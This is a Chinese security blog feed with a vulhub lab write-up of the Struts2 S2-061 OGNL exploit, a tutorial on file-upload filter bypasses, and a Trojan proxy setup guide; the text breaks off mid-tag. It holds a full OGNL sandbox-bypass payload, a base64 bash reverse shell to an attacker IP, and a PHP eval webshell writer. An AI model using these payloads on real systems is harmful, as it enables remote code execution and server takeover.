<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Form&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-01-02T03:14:05.973Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Mikey</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Apache Struts2 S2-061 远程代码执行漏洞（CVE-2020-17530）</title>
    <link href="http://example.com/2021/12/28/Apache-Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89/"/>
    <id>http://example.com/2021/12/28/Apache-Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89/</id>
    <published>2021-12-28T15:13:32.000Z</published>
    <updated>2022-01-02T03:14:05.973Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Struts2 会对某些标签属性(比如 <code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 <code>%&#123;x&#125;</code> 且 <code>x</code> 的值用户可控时，用户再传入一个 <code>%&#123;payload&#125;</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。</p><p>漏洞信息：<a href="https://cwiki.apache.org/confluence/display/WW/S2-059">https://cwiki.apache.org/confluence/display/WW/S2-059</a></p><span id="more"></span><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ol><li> 靶机 centos7  IP：192.168.227.145</li><li> 攻击机：kali  IP：192.168.227.128</li><li> vulhub 靶场   struts2/s2-61</li></ol><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><ol><li>git 下载 vulhub<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure></li><li>进入 vulhub/struts2/s2-61 目录下，开启靶场<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li><li>查看靶场信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281946189.png" alt="docker ps"></li><li>进入靶场：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281947947.png" alt="靶场"></li></ol><h2 id="验证漏洞点"><a href="#验证漏洞点" class="headerlink" title="验证漏洞点"></a>验证漏洞点</h2><h3 id="URL-验证"><a href="#URL-验证" class="headerlink" title="URL 验证"></a>URL 验证</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%25%7b+%27fuxian%27+%2b+(2000+%2b+21).toString()%7d</span><br></pre></td></tr></table></figure><p>编码前：</p><blockquote><p>?id=%{ ‘fuxian’ + (2000 + 21).toString()}</p></blockquote><p>最后输出的结果应该是<code>fuxian2021</code></p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281910183.png"></p><h3 id="Dnslog-验证"><a href="#Dnslog-验证" class="headerlink" title="Dnslog 验证"></a>Dnslog 验证</h3><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><blockquote><p>%{(#instancemanager=#application[“org.apache.tomcat.InstanceManager”]).(#stack=#attr[“com.opensymphony.xwork2.util.ValueStack.ValueStack”]).(#bean=#instancemanager.newInstance(“org.apache.commons.collections.BeanMap”)).(#bean.setBean(#stack)).(#context=#bean.get(“context”)).(#bean.setBean(#context)).(#macc=#bean.get(“memberAccess”)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(“java.util.HashSet”)).(#bean.put(“excludedClasses”,#emptyset)).(#bean.put(“excludedPackageNames”,#emptyset)).(#arglist=#instancemanager.newInstance(“java.util.ArrayList”)).(#arglist.add(“ping eftf8t.ceye.io”)).(#execute=#instancemanager.newInstance(“freemarker.template.utility.Execute”)).(#execute.exec(#arglist))}</p></blockquote><p>其中执行远程命令的位置在：<code>#arglist.add()</code></p><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p>BurtSuit抓包，将Get修改为Post：</p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281825311.png" alt="抓包修改"></p><p>查看Dnslog：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281825418.png" alt="dnslog验证"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹shell需要base64编码：</p><blockquote><p>bash  -i &gt;&amp; /dev/tcp/192.168.227.128/9000 0&gt;&amp;1</p></blockquote><p>完整的反弹shell代码</p><blockquote><p>bash -c {echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMjcuMTI4LzkwMDAgMD4mMQ==}|{base64,-d}|{bash,-i}</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><blockquote><p>%{(#instancemanager=#application[“org.apache.tomcat.InstanceManager”]).(#stack=#attr[“com.opensymphony.xwork2.util.ValueStack.ValueStack”]).(#bean=#instancemanager.newInstance(“org.apache.commons.collections.BeanMap”)).(#bean.setBean(#stack)).(#context=#bean.get(“context”)).(#bean.setBean(#context)).(#macc=#bean.get(“memberAccess”)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(“java.util.HashSet”)).(#bean.put(“excludedClasses”,#emptyset)).(#bean.put(“excludedPackageNames”,#emptyset)).(#arglist=#instancemanager.newInstance(“java.util.ArrayList”)).(#arglist.add(“bash -c {echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMjcuMTI4LzkwMDAgMD4mMQ==}|{base64,-d}|{bash,-i}”)).(#execute=#instancemanager.newInstance(“freemarker.template.utility.Execute”)).(#execute.exec(#arglist))}</p></blockquote><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>Kali 使用 NC 监听端口：</p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281928579.png"></p><p>BurpSuit 抓包，修改为 POST 方法，添加exp<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281932011.png"></p><p>成功反弹shell<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281856268.png"></p><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>如果想了解更详细的漏洞信息及原理可以参考下面的文章：<br><a href="http://buaq.net/go-47936.html"> Struts2 S2-061漏洞分析(CVE-2020-17530)</a><br><a href="https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g"># Struts2 S2-061漏洞分析(CVE-2020-17530)</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Struts2 会对某些标签属性(比如 &lt;code&gt;id&lt;/code&gt;，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 &lt;code&gt;%&amp;#123;x&amp;#125;&lt;/code&gt; 且 &lt;code&gt;x&lt;/code&gt; 的值用户可控时，用户再传入一个 &lt;code&gt;%&amp;#123;payload&amp;#125;&lt;/code&gt; 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。&lt;/p&gt;
&lt;p&gt;漏洞信息：&lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-059&quot;&gt;https://cwiki.apache.org/confluence/display/WW/S2-059&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apache" scheme="http://example.com/tags/Apache/"/>
    
    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>文件上传之黑白名单绕过</title>
    <link href="http://example.com/2021/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2021/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</id>
    <published>2021-12-23T16:16:18.000Z</published>
    <updated>2022-01-01T16:49:11.615Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112232355500.png"></p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要对文件上传中的黑白名单的绕过方式进行学习和整理。<br>这里的黑名单白名单指在上传点的限制方式，黑名单例如仅拒绝 xxx 格式上传，只要上传的内容不是 xxx 格式，文件均可以上传到服务器，对应的白名单即为仅允许上传 yyy 格式，只要不是 yyy 格式的文件全部拒绝上传。</p><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="上传特殊可解析后缀"><a href="#上传特殊可解析后缀" class="headerlink" title="上传特殊可解析后缀"></a>上传特殊可解析后缀</h3><p>例如使用php的网站，可以尝试phps,php3,php5,php7,phtml等后缀进行绕过尝试</p><h3 id="上传-access文件"><a href="#上传-access文件" class="headerlink" title="上传.access文件"></a>上传.access文件</h3><p>这里的 .access 只是一个泛例，具体包括 .htaccess 和 .user.ini 等可造成解析漏洞的文件。</p><h4 id="haccess文件"><a href="#haccess文件" class="headerlink" title=".haccess文件"></a>.haccess文件</h4><blockquote><p><strong>.htaccess：</strong><br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p></blockquote><p>可以编辑一个 .htaccess 文件写入以下内容上传至服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112240011022.png"><br>上传该文件后再上传一个未在黑名单中的文件，如图片马，只要该文件有可执行的 php 代码，就可以执行文件中的 php 代码。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>1.mod_rewrite模块开启<br>2.AllowOverride All</p></blockquote><h4 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h4><blockquote><p><strong>user.ini.</strong><br>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被<br> CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web<br>   根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p></blockquote><blockquote><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p></blockquote><blockquote><p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。<br>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是<br>   .user.ini。<br>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote><p>先上传一个以 auto_prepend_file=1.gif 为内容的 .user.ini 文件，然后再上传一个内容为php的一句话的脚本，命名为1.gif。<br>.user.ini文件里的意思是：所有的php文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。</p><p>因为已经存在一个php文件，所以我们只需要在1.gif文件中包含我们所需要的php代码，再去访问原本的php，就可以帮助我们对1.gif内的php代码进行解析，我们就得以进行利用。</p><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>  服务器脚本语言为PHP<br>  服务器使用CGI／FastCGI模式<br>  上传目录下要有可执行的php文件</p></blockquote><h3 id="后缀大小写绕过"><a href="#后缀大小写绕过" class="headerlink" title="后缀大小写绕过"></a>后缀大小写绕过</h3><p>windows 系统中的特性，文件的文件名大小写组合也可以运行，是不区分大小写的，所以在一些上传点中，例如黑名单禁止 x.php 上传，就可以构造 x.Php 等文件，上传到服务器之后 x.Php 在 windows 系统中仍然会以 php 文件来处理执行。</p><h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>Windows 系统</p></blockquote><h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><p>在某些环境中可以使用 x.php. 文件绕过上传，文件上传到 windows 服务器后，会根据 windows 特有的机制在保存文件是将文件结尾的 . 去掉，这样既绕过里上传限制，也保存下来里 x.php 文件（结尾加 . 可以与双写或大小写混用）</p><h4 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>Windows 系统</p></blockquote><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>windows 系统中的特性，windows 会在保存文件时将空格去掉。</p><h4 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>Windows 系统</p></blockquote><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><p>在php+windows的情况下：如果文件名+<code>==$DATA</code>会把<code>==$DATA</code>之后的数据当成文件流处理,不会检测后缀名.且保持<code>::$DATA</code>之前的文件名。利用windows特性，可在后缀名中加<code> ::$DATA</code>绕过</p><blockquote><p>PS:复制图像地址时，会附带::$DATA，要去掉后再连接，否则找不到文件。</p></blockquote><h4 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>Windows 系统 +PHP</p></blockquote><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>例如这样的限制代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure><p>直接使用双写绕过就行 x.pphphp ，最后生成 x.php 文件。</p><h3 id="配合解析漏洞绕过"><a href="#配合解析漏洞绕过" class="headerlink" title="配合解析漏洞绕过"></a>配合解析漏洞绕过</h3><h4 id="Apache-陌生后缀解析漏洞"><a href="#Apache-陌生后缀解析漏洞" class="headerlink" title="Apache 陌生后缀解析漏洞"></a>Apache 陌生后缀解析漏洞</h4><p>根据apache的后缀名识别漏洞：从右往左依次识别后缀，遇到不能识别的后缀名便跳过，所以如果目标的waf是根据最后一个后缀进行判断，我们可以构建一个xxx.php.abc这样的文件名进行绕过，因为apach无法识别abc后缀，所以最后会识别到php文件，会把文件当作php文件进行执行。</p><h4 id="Apache-换行解析漏洞"><a href="#Apache-换行解析漏洞" class="headerlink" title="Apache 换行解析漏洞"></a>Apache 换行解析漏洞</h4><p>Apache HTTPD是一款HTTP服务器，其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。该漏洞属于用户配置不当所产生，与具体中间件版本无关。<br>所以我们可以构建 xxx.jpg\x0Aphp文件进行上传。</p><h5 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>Apache 版本 2.4.0~2.4.29</p></blockquote><h4 id="nginx-解析漏洞"><a href="#nginx-解析漏洞" class="headerlink" title="nginx 解析漏洞"></a>nginx 解析漏洞</h4><p>该漏洞与nginx、php版本无关,属于用户配置不当造成的解析漏洞</p><p>解析格式：1.jpg/.php、1.jpg/%00.php，1.jpg会被当成php格式解析</p><p>nginx和iis7.x解析漏洞类似，都是加上/.php后文件以php格式解析。</p><h5 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>配置文件vim /etc/php5/fpm/php.ini、vim /etc/php5/fpm/pool.d/<a href="http://www.conf/">www.conf</a></p></blockquote><blockquote><p>关键配置项: cgi.fix_pathinfo=1，security.limit_extensions=允许解析其他格式为php，则存在解析漏洞。</p></blockquote><h3 id="竞争条件绕过"><a href="#竞争条件绕过" class="headerlink" title="竞争条件绕过"></a>竞争条件绕过</h3><p>网站逻辑：</p><ul><li>网站允许上传任意文件，然后检查文件是否符合上传的条件，若不符合则删除上传的文件。</li></ul><p>我们只需要在删除之前访问上传的php文件，从而执行上传文件中的php代码。</p><p>例如：上传文件代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>先进行文件上传，后进行判断与删除。利用时间差进行webshell上传。</p><h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><h3 id="MIME-绕过"><a href="#MIME-绕过" class="headerlink" title="MIME 绕过"></a>MIME 绕过</h3><blockquote><p><strong>MIME 类型简介：</strong><br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></blockquote><h4 id="常见的-MIME-类型"><a href="#常见的-MIME-类型" class="headerlink" title="常见的 MIME 类型"></a>常见的 MIME 类型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">超文本标记语言文本 .html text/html</span><br><span class="line">xml文档 .xml text/xml</span><br><span class="line">普通文本 .txt text/plain</span><br><span class="line">PDF文档 .pdf application/pdf</span><br><span class="line">Microsoft Word文件 .word application/msword</span><br><span class="line">PNG图像 .png image/png</span><br><span class="line">GIF图形 .gif image/gif</span><br><span class="line">JPEG图形 .jpeg,.jpg image/jpeg</span><br><span class="line">GZIP文件 .gz application/x-gzip</span><br></pre></td></tr></table></figure><p>完整的 MIME 格式类型参考：</p><p><a href="https://www.w3school.com.cn/media/media_mimeref.asp">https://www.w3school.com.cn/media/media_mimeref.asp</a></p><p>可能文件是对MIME的类型做了限制，比如对content-type请求头中的文件类型做了限制。<br>只允许image/png 和 image/jpeg 的文件上传，那么，我们只需要抓包修改文件中的MIME文件类型为image/png 或imag/jpeg即可。</p><h3 id="结合解析漏洞绕过"><a href="#结合解析漏洞绕过" class="headerlink" title="结合解析漏洞绕过"></a>结合解析漏洞绕过</h3><h4 id="00-或0x00截断绕过"><a href="#00-或0x00截断绕过" class="headerlink" title="%00 或0x00截断绕过"></a>%00 或0x00截断绕过</h4><blockquote><p><strong>00截断：</strong><br>无论0x00还是%00，最终被解析后都是一个东西:chr（0） chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p></blockquote><blockquote><p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p></blockquote><blockquote><p>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。</p></blockquote><blockquote><p>PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置。</p></blockquote><h4 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>00截断在 php 环境中需要满足以下要求，二者缺一不可。<br>php 版本小于 5.3.4<br>php的magic_quotes_gpc为OFF状态</p></blockquote><h3 id="上传-access文件绕过"><a href="#上传-access文件绕过" class="headerlink" title="上传.access文件绕过"></a>上传.access文件绕过</h3><p>同样的原理绕过方式，配合解析漏洞，在 linux 环境中仍然适用，因为此类漏洞是 php 或者中间件造成的，操作系统不可控制该漏洞。</p><h3 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h3><p>同样的原理绕过方式，是由于代码的逻辑错误造成的，不受其他环境影响。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.modb.pro/db/75750">https://www.modb.pro/db/75750</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote><p>文中所涉及的技术,思路和工具仅供以安全为目的的学习交流使用，请勿做非法用途否则后果自负。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112232355500.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Vultr + Trojan 脚本安装</title>
    <link href="http://example.com/2021/12/21/Vultr-Trojan-%E8%84%9A%E6%9C%AC%E5%AE%89%E8%A3%85/"/>
    <id>http://example.com/2021/12/21/Vultr-Trojan-%E8%84%9A%E6%9C%AC%E5%AE%89%E8%A3%85/</id>
    <published>2021-12-21T05:23:51.000Z</published>
    <updated>2022-01-01T16:44:23.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Trojan-介绍"><a href="#Trojan-介绍" class="headerlink" title="Trojan 介绍"></a>Trojan 介绍</h2><p>Trojan，原来多是指特洛伊木马，是一种计算机病毒程序。但是，我们今天所说的Trojan是一种新的科学上网技术，全称为Trojan-GFW，是目前最成功的科学上网伪装技术之一。你可以认为Trojan是V2Ray的“WS+TLS”模式的精简版，速度比V2Ray更快，伪装比V2Ray更逼真，更难以被GFW识别。<br>Trojan工作原理：Trojan通过监听443端口，模仿互联网上最常见的 HTTPS 协议，把合法的Trojan代理数据伪装成正常的 HTTPS 通信，并真正地完整完成的TLS 握手，以诱骗GFW认为它就是 HTTPS，从而不被识别。Trojan处理来自外界的 HTTPS 请求，如果是合法的，那么为该请求提供服务，否则将该流量转交给Caddy、Nginx等 web 服务器，由 Caddy、Nginx 等为其提供网页访问服务。基于整个交互过程，这样能让你的VPS更像一个正常的web服务器，因为Trojan的所有行为均与 Caddy、Nginx等 web 服务器一致，并没有引入额外特征，从而达到难以识别的效果。<br>Trojan-Go是Trojan-GFW的分支项目，对Trojan进行性能优化，并增加不少新功能，Trojan-Go性能和功能均有大幅度的提升，而且支持分流和CDN。</p><span id="more"></span><h2 id="Trojan多用户一键搭建脚本"><a href="#Trojan多用户一键搭建脚本" class="headerlink" title="Trojan多用户一键搭建脚本"></a>Trojan多用户一键搭建脚本</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><blockquote><p>Vultr + centos7</p></blockquote><p>Vultr 是国外的一家vps产商，可以方便无限制地更换ip，所以比较适合我们搭建我们的vpn，这里创建的服务器处于美国西雅图，因为日本，韩国地区的速度比较差。</p><h3 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h3><p><strong>执行一键脚本安装命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> &lt;(curl -sL https://git.io/trojan-install)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211047752.png"><br>当以上命令执行完毕会安装Trojan管理程序</p><h4 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h4><p>选择安装SSL证书的方式并绑定域名，我们选择“<strong>1.Let’s Encrypt 证书</strong>”，然后输入域名，如“xxx.myvps.tk”。如下图所示：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211053704.png"><br>请确认域名输入准确无误，然后回车，进入SSL证书安装过程。稍等片刻安装完成</p><h4 id="安装mysql数据库"><a href="#安装mysql数据库" class="headerlink" title="安装mysql数据库"></a>安装mysql数据库</h4><p>在键盘按数字“1”，然后直接进入”安装docker版mysql(mariadb)”的过程。安装完成后，一键安装脚本提示设置连接Trojan服务器的用户名和密码。如下图所示：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211057199.png"><br>一般情况下，使用其随机生成的用户名和密码即可，也可以自己输入想使用的用户名密码。<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211059879.png"></p><blockquote><p>PS:如果你忘记了登录密码，也可以在“<strong>web管理</strong>”重置web管理员密码。</p></blockquote><p>至此，Trojan多用户一键搭建脚本安装完毕。现在你可以输入’<strong>trojan</strong>‘可进入管理程序，在出现的管理程序菜单，直接在键盘按“数字键”直接进入相关菜单或执行命令，直接按“回车键”返回上级菜单。比如，你直接按数字键“5”，可查看用户配置的用户名、密码和Trojan分享链接，以及单用户的上传、下载流量和流量限额。如下图所示：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211100680.png"></p><p>该版本还提供了web界面，如<code>https://xxx.myvps.tk</code>，登录web面板管理trojan用户。如下图所示：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211106067.png"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用我们的客户端，添加我们的服务器，测试其速度<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211105566.png"></p><h2 id="BBR加速"><a href="#BBR加速" class="headerlink" title="BBR加速"></a>BBR加速</h2><h3 id="安装-wget-依赖包"><a href="#安装-wget-依赖包" class="headerlink" title="安装 wget 依赖包"></a>安装 wget 依赖包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget</span><br></pre></td></tr></table></figure><h3 id="执行BBR加速一键安装脚本命令"><a href="#执行BBR加速一键安装脚本命令" class="headerlink" title="执行BBR加速一键安装脚本命令"></a>执行BBR加速一键安装脚本命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/src &amp;&amp; wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span> &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><p>安装完成后：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211111224.png"></p><p>然后可以选择想使用的bbr及开启加速，安装后可能需要重启，重启后进入 /usr/src 目录，输入 ./tcp.sh 即可重新进入界面</p><p>开启后，测试真实速度，可以看到速度提升的不少<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211118156.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://iyideng.vip/black-technology/cgfw/trojan-server-building-and-using-tutorial.html#4%E3%80%81%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E5%B9%B6%E5%BC%80%E5%90%AFBBR%E5%8A%A0%E9%80%9F">一灯不是和尚 - Trojan一键搭建教程2022</a></p><p><a 